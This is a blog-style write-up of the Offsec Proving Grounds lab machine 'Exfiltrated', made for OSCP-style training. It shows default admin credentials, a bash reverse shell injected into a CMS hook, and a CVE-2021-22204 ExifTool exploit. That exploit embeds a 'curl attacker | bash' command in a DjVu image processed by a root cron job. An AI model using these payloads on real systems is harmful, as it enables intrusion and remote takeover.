---
title: "Proving grounds Practice: Exfiltrated"
layout: post
date: 2023-08-26 06:00
tag: 
- CTF
- Offsec labs
- OSCP
- Writeup
- Linux
- Pg-Practice
writeups: true
hidden: true
author: Naveen
description: "Offsec proving grounds practice linux machine writeup"
---

## Nmap

```sh
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

## PORT: 80 | Web

http://exfiltrated.offsec/

![img](/assets/images/CTF/Proving_Grounds/Exfiltrated/admin-dashboard.png)

### Admin Dashboard

http://exfiltrated.offsec/panel/

### Password

admin:admin

![img](/assets/images/CTF/Proving_Grounds/Exfiltrated/admin-dashboard2.png)

Navigate to System->Hooks-> Edit sitemapGeneration

Add the below reverse shell code and click save.

```php
exec("/bin/bash -c 'bash -i >& /dev/tcp/IP/1234 0>&1'");
```
![img](/assets/images/CTF/Proving_Grounds/Exfiltrated/shell1.png)

Trigger shell by clicking the generate sitemap menu.

![img](/assets/images/CTF/Proving_Grounds/Exfiltrated/shell2.png)

**Initial Foothold obtained**

## Privilege Escalation

Check for cron jobs

```sh
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* *	* * *	root	bash /opt/image-exif.sh
#
```

Cronjob running a script `/opt/image-exif.sh`

```sh
cat /opt/image-exif.sh
#! /bin/bash
#07/06/18 A BASH script to collect EXIF metadata 

echo -ne "\\n metadata directory cleaned! \\n\\n"


IMAGES='/var/www/html/subrion/uploads'

META='/opt/metadata'
FILE=`openssl rand -hex 5`
LOGFILE="$META/$FILE"

echo -ne "\\n Processing EXIF metadata now... \\n\\n"
ls $IMAGES | grep "jpg" | while read filename; 
do 
    exiftool "$IMAGES/$filename" >> $LOGFILE 
done

echo -ne "\\n\\n Processing is finished! \\n\\n\\n"
```

It appears to be there is a vulnerability for ExifTool versions 7.44 and above [CVE-2021-22204](https://nvd.nist.gov/vuln/detail/CVE-2021-22204).

Install `djvulibre-bin`.

As per the recon the cron job has been running the script as root user.

Create a reverse shell script `shell.sh`.

```sh
#!/bin/bash

bash -c 'bash -i >& /dev/tcp/<IP>/4444 0>&1'
```

Create a file as exploit and add the below content.

```sh
(metadata "\c${system ('curl http://<attacker_IP>:<PORT>/shell.sh | bash')};")
```

The attacker IP and PORT is specified on the above to download the `shell.sh` file into the attacking machine to obtain the root shell.

Now create djvu file and rename it to `jpg`.

```sh
djvumake exploit.djvu INFO=0,0 BGjp=/dev/null ANTa=exploit

cp exploit.djvu exploit.jpg
```

Now curl to download the `exploit.jpg` file into the attacking machine's uploads folder `/var/www/html/subrion/uploads`.

![img](/assets/images/CTF/Proving_Grounds/Exfiltrated/transfer.png)

Once the `exploit.jpg` is downloaded into the uploads folder the cronjob runs the script, and when the exiftool reads the metadata from the `exploit.jpg` file it executes the command we have binded in the image.

Then it downloads the reverse shell script `shell.sh` from the attacker's machine and runs it as root.

![img](/assets/images/CTF/Proving_Grounds/Exfiltrated/root.png)

**Root Obtained**

Thanks for reading!

For more insights and updates, follow me on Twitter: [@thevillagehacker](https://twitter.com/thevillagehackr).